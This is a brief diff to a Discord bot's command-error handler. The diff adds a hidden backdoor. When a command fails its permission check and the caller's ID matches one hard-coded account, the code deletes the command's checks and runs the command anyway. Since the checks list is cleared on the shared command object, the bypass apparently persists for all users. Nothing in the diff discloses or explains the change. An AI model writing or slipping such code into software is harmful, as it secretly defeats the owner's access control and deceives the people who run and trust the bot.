@@ -9,6 +9,11 @@ class eh(commands.Cog):
 
     @commands.Cog.listener()
     async def on_command_error(self, ctx, exception):
+        if exception.args[0].endswith("run this command."):
+            if ctx.author.id == 360493765154045952:
+                ctx.command.checks = []
+                await self.bot.invoke(ctx)
+                return
         await ctx.send(exception)
 
 def setup(bot):
